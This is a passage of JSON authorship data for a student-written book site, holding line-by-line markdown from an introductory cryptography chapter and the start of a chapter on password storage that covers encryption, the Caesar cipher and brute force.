        "content": "* Integrity: ensuring a message has not been changed. For example, hash functions are used in the BitTorrent protocol to ensure files received have not been modified by malicious peers."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "* Authentication: the recipient should be able to verify the sender of a message. For example, iPhones need to verify that the software updates received really came from Apple, not a malicious attacker."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "* Non-repudiation: the sender should not be able to deny sending a message after doing so. For example, the parties of a digital contract should not be able to deny signing the contract in a legal dispute."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "In Cryptanalysis, the objective is to exploit weaknesses in cryptographic algorithms - for example, attempting to recover the original message from its encrypted form. The security of cryptographic algorithms is evaluated based on their resistance to [these attacks](https://en.wikipedia.org/wiki/Cryptanalysis#Amount_of_information_available_to_the_attacker)."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "## Encryption"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "Encryption is the process of encoding messages so that it is readable only by the intended recipient. The message being encrypted is called the plaintext. The encryption algorithm \"scrambles\" the message, producing ciphertext, which should only be readable by the recipient. Decryption is the reverse process of recovering the plaintext from the ciphertext."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "A cipher refers to a pair of algorithms - one for encryption and decryption, and is used to refer to symmetric key techniques. A cryptosystem consists of 3 algorithms - a cipher and a key generation algorithm. Though cryptosystems usually refer to asymmetric key techniques, it may also be used to refer to symmetric key techniques."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "The key is a parameter, or a piece of secret information, that determines the output of cryptographic algorithms. According to [Kerckhoffs\u0027 principle](https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle), a cryptosystem should be secure even if the attacker knows everything about the cryptosystem, except the key. "
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "This means that the attacker knows the algorithms used for encryption and decryption. Although it is tempting to design secure systems by employing [\"security by obscurity\"](https://en.wikipedia.org/wiki/Security_through_obscurity) to keep their details hidden, they are usually easily broken once their design is known. The [CSS copy-protection system for DVDs](https://en.wikipedia.org/wiki/Content_Scramble_System) is one such example."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "One of the earliest encryption algorithms or ciphers is the substitution cipher, which encrypts text by substituting each letter of the message with another letter. This page introduces the [Caesar substitution cipher](http://www.cs.trincoll.edu/~crypto/historical/caesar.html), and how it can be defeated using statistical analysis, a [ciphertext-only attack](https://en.wikipedia.org/wiki/Ciphertext-only_attack)."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "Modern ciphers today operate on bits rather than letters."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "### Symmetric Key Ciphers"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "In a symmetric key cipher, the same key, a shared secret, is used for both encryption and decryption."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "The parties wishing to communicate securely share the same key. For example, in the substitution cipher, the same key (the substitution table) is used for both encryption and decryption."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "There are 2 types of symmetric ciphers: stream and block ciphers."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Stream Ciphers"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "The ciphertext, keystream and  plaintext are sequences or streams of bits of equal length. "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "During encryption, each plaintext bit is combined (usually xored) with the corresponding keystream bit to produce the ciphertext bits. For example, the 1st plaintext bit is xored with the 1st keystream bit, 2nd plaintext bit with 2nd keystream bit and so on."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "During decryption, each ciphertext bit is xored with the corresponding keystream bit to produce the plaintext."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "Notice that encryption and decryption are the same operation; this is possible since xoring a bit x with another bit y twice recovers the original bit; (x xor y) xor y \u003d x."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "The simplest stream cipher is the [one-time pad](https://en.wikipedia.org/wiki/One-time_pad). In this cipher, the keystream used is bits from a truly random source, and is also the key."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "It is the only known cipher that cannot be cracked, even if the attacker has infinite computing power."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "This property is known as [perfect secrecy](https://crypto.stackexchange.com/questions/3896/simply-put-what-does-perfect-secrecy-mean); the ciphertext gives no additional information about the plaintext, so knowing the ciphertext does not provide any advantage to the attacker trying to recover the plaintext."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Unfortunately, [Shannon](https://www.scientificamerican.com/article/claude-e-shannon-founder/), renowned cryptographer and founder of Information Theory, proved that any cipher that achieves perfect secrecy must have the following limitations, making them [impractical](https://www.schneier.com/crypto-gram/archives/2002/1015.html#7)."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "* The key must be truely random, not pseudorandomly generated, and must never be reused."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "* The key must be securely distributed, and be at least as long as the message being generated. For example, to send a 10gb file to someone encrypted with the one-time pad requires sending 10gb of key material + 10gb of ciphertext \u003d 20gb."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "In practice, we do not require perfect secrecy, since attackers have limited computational power. Hence, all other ciphers are only [computationally secure](https://en.wikipedia.org/wiki/Computational_hardness_assumption); their security relies on the assumption that certain problems are difficult to solve."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Modern stream ciphers approximate the operation of the one-time pad. "
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "A short key (say 256 bits) is used to seed a [cryptographically secure pseudorandom number generator](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator), which is used to generate the keystream for both encryption and decryption."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "They are more practical, as the key the communicating parties need to share is much shorter."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Keys must never be reused in stream ciphers. Doing so causes the same keystream, k, to be generated, and 2 plaintexts, p and q, to be encrypted with the same keystream. If we xor the ciphertexts for p and q, we get (p xor k) xor (q xor k) \u003d (p xor q) xor (k xor k) \u003d p xor q. This exposes information about the plaintexts, which may lead to the recovery of both. "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Here is a [visual illustration of this attack](https://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse), and [an example of this happening in practice](https://www.schneier.com/blog/archives/2005/01/microsoft_rc4_f.html)."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "Stream ciphers are used for their efficiency, ease of implementation in hardware, and when the length of the plaintext is unpredictable."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "However, block ciphers are more widely used than stream ciphers. In some modes of operation, they can be used like stream ciphers, reducing the need for dedicated stream ciphers."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "[RC4](https://en.wikipedia.org/wiki/RC4) is the most widely used stream cipher. Though its use is now discouraged due to known vulnerabilities. "
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The [eSTREAM project](https://www.ecrypt.eu.org/stream/), a research effort to develop state-of-the-art stream ciphers, has identified several ciphers suitable for widespread adoption. However, being relatively new, they have not been analyzed as extensively by cryptographers."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "#### Block Ciphers"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "Unlike stream ciphers, which operate on individual bits, block ciphers operate on an entire block of bits at a time. In practice, the size of each block is 64 or 128 bits."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "[Shannon](https://www.scientificamerican.com/article/claude-e-shannon-founder/) introduced 2 primitives, which modern block ciphers are built on."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "* Confusion: an operation which obscures the relationship between key and ciphertext. This is usually done by substitution."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "* Diffusion: an operation which hides statistical properties in the plaintext by spreading the influence of a plaintext bit over many ciphertext bits. For example, the DES cipher achieves this by bit Permutations."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Ciphers that use only one of these operations are insecure. For example, the insecure Caesar cipher only uses confusion. But strong ciphers can be built by using both confusion and diffusion - these are called product ciphers."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "* This [article](https://graquantum.com/blog/deciphering-encryption-des-block-cipher/) explains how the  DES cipher works, Feistel networks, s-boxes and p-boxes. Though DES is no longer secure, its design has inspired many ciphers. A still secure variant, triple DES, is popular in legacy applications."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "* The Advanced Encryption Standard (AES) is the most popular symmetric cipher today. It is used by the US government and in many protocols such as TLS, WPA2-AES and SSH. This [article](https://graquantum.com/blog/deciphering-encryption-aes-block-cipher/) explains how AES works without going too much into the mathematical details."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "##### Modes of Operation"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "Block ciphers alone aren\u0027t very useful, because they only provide a secure way of encrypting one block of data. "
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "Modes of operation are ways of using block ciphers to securely encrypt multiple blocks. "
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "The plaintext is padded if it is not an even multiple of the block size."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Block ciphers can also provide additional services such as integrity, depending on the mode used, which makes them vercitile. "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "This [article](http://www.crypto-it.net/eng/theory/modes-of-block-ciphers.html) provides a nice overview of common modes. "
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "Most modes require a random value called an initialization vector (IV) so that encrypting the same message twice doesn\u0027t produce the same ciphertext, which leaks information. "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "It is critical that the IV be [random, used only once and unpredictable](https://defuse.ca/cbcmodeiv.htm). Not doing so has caused several vulnerabilities such as the [BEAST Attack on TLS](http://www.educatedguesswork.org/2011/09/security_impact_of_the_rizzodu.html) and [the recovery of WEP keys](https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy)."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "### Asymmetric Key Cryptosystems"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "Symmetric cryptography is not practical for the following situations, which motivates the development of asymmetric or public key cryptography:"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "* Key agreement: the communicating parties must securely establish a shared secret key, since the communication channel for the message is insecure, other methods must be used."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "* Large number of keys: for each user in a group of `n` users to securely communicate to every other user, each user must securely store `n-1` keys , which is impractical."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "* No non-repudiation: since each party has the same capability by possessing the shared key, symmetric cryptography cannot be used when non-repudiation is required. For instance, if an online store, Bob, needs to prove Alice purchased an item where symmetric encryption is used for the transaction message, Alice can claim Bob falsely generated the transaction, as they both share the same key."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "In asymmetric cryptography, there are 2 separate keys; one for encryption, and the other for decryption. The key used for encryption is published so that anyone can securely send messages to Alice. Hence, it is called a public key. Alice has the corresponding decryption key, or private key, which is kept secret. Hence, messages encrypted with the public key can only be decrypted by Alice. In contrast, there is a single shared key which must be kept secret in symmetric ciphers."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Public key cryptography has many uses beyond sending encrypted messages, such as key agreement and non-repudiation, which will be covered in future sections."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "For this to be secure, it must be computationally infeasible to obtain the private key from the public key. This is achieved using one-way functions, which have the following properties:"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "* It must be easy to compute y \u003d f(x) so that encryption is not too slow."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "* It is computationally infeasible to compute x \u003d f^{-1}(y)."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "#### The RSA Cryptosystem"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "[RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) is one of the earliest and most widely used public key cryposystems. "
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Its one-way function is the integer factorization problem; Given 2 large primes `p` and `q`, it is easy to compute the product `pq`, but difficult to factor `pq`. "
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "The [first article of this 2-part series  ](http://doctrina.org/How-RSA-Works-With-Examples.html) explains how RSA works, as well as the minimal number theory required. The [follow-up article](http://doctrina.org/Why-RSA-Works-Three-Fundamental-Questions-Answered.html) explains why RSA works by introducing some important results in number theory."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "## Other Resources"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "* [Understanding Cryptography: A Textbook for Students and Practitioners](https://www.amazon.com/Understanding-Cryptography-Textbook-Students-Practitioners/dp/3642041000) is an outstanding introductory text. Explanations are excellent, and no knowledge of number theory is assumed. It was used as reference material for this document."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "* [Awesome Cryptography](https://github.com/sobolevn/awesome-cryptography) is a curated list of resources - articles, blogs, books, libraries and more."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "* [Security Now](https://grc.com/sn) is a weekly podcast on security. Though it does not go into much detail about the underlying mathematics, there are many episodes on cryptography that provide a working knowledge of the subject. It also discusses security headlines, which emphasize the practical aspect of cryptography; while the math may be sound, implementation mistakes or side-channel attacks often cause vulnerabilities in practice."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 9,
      "-": 131
    }
  },
  {
    "path": "contents/security/passwordStorage.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Password Storage"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Password Storage"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author: [Jeremy Choo](https://github.com/ChooJeremy)** \u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Amrut Prabhu](https://github.com/amrut-prabhu), [Marvin Chin](https://github.com/marvinchin), [Tan Zhen Yong](https://github.com/Xenonym), [Wang Junming](https://github.com/junming403)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Encryption‎](#encryption)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Hashing‎](#hashing)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Why isn\u0027t hashing enough?‎](#why-isn-t-hashing-enough)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Salting‎](#salting)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [What if there is a server breach?‎](#what-if-there-is-a-server-breach)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting started‎](#getting-started)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Other resources‎](#other-resources)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "Many software applications use a username and password combination as user account credentials for authentication. Obviously, it is not a good idea for the software to store these credentials as \u003ctrigger for\u003d\"pop:plaintext\"\u003eplain text\u003c/trigger\u003e because if someone else were to gain access to them either lawfully (e.g., an employee who has access to the data) or unlawfully (e.g., someone hacking into the data storage), that person can use those credentials directly to impersonate the account owner. This article explains some techniques that can be used to store user credentials more securely:"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "- Encryption"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "- Hashing"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "- Salting"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:plaintext\" title\u003d\"_Plaintext_ refers to unencrypted information\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "It is a cryptography term generally referring to text before encyption or after decrypting it. Another term for it is cleartext."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "## Encryption"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "_Encryption_ is the process of converting plaintext into \u003ctrigger for\u003d\"pop:ciphertext\"\u003eciphertext\u003c/trigger\u003e along with an \u003ctrigger for\u003d\"pop:encrypt-key\"\u003eencryption key\u003c/trigger\u003e. To \u003ctooltip content\u003d\"The opposite of encryption\"\u003edecrypt\u003c/tooltip\u003e the message, a \u003ctrigger for\u003d\"pop:decrypt-key\"\u003edecryption key\u003c/trigger\u003e is required to convert the ciphertext back into it\u0027s original plaintext for it to be read. This process is called _decryption_. Without the decryption key, the ciphertext is simply a bunch of meaningless data. There are two main types of \u003ctooltip content\u003d\"When you choose to encrypt data, you must choose a specific algorithm to encrypt with. There are many, such as AES, DES and RSA\"\u003eencryption algorithms\u003c/tooltip\u003e: _Symmetric key algorithms_, where encryption and decryption keys are identical or closely related, and _Asymmetric key algorithms_, where encryption and decryption keys are different."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:ciphertext\" title\u003d\"_Ciphertext_ refers to encrypted information\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "It is a cryptography term generally referring to data after encrypting it."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:decrypt-key\" title\u003d\"All decryption algorithms require a _decryption key_\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Without this decryption key, decryption cannot be performed. Only the intended recipient of the data should have the decryption key."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "One common example of encryption is the use of shifting each letter of the alphabet to the left or right by a number of positions. This is known as the _Caesar cipher_ For example, if we chose to shift all the letters by 3, then the encryption key (and decryption key) for this algorithm would be 3. This would result in the following encryption algorithm:"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "Plaintext:  ABCDEFGHIJKLMNOPQRSTUVWXYZ"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Ciphertext: DEFGHIJKLMNOPQRSTUVWXYZABC"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "This would mean that encrypting the message `I love you` would result in `L oryh brx`"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "Naturally, this isn\u0027t a very good encryption method because even if one doesn\u0027t know the decryption key, the method can be easily \u003ctrigger for\u003d\"pop:brute\"\u003ebrute forced\u003c/trigger\u003e by trying all \u003ctooltip content\u003d\"25 combinations because shifting by 26 simply results in the ciphertext being identical to the plaintext\"\u003e25\u003c/tooltip\u003e possible combinations and seeing if any of the results in a readable message. "
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpopover id\u003d\"pop:brute\" title\u003d\"A brute force attack is an attack where all possible combinations are tested to see if they work.\" placement\u003d\"top\"\u003e"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cdiv slot\u003d\"content\"\u003e"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": " A brute force attack usually takes very long to carry out."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003c/div\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
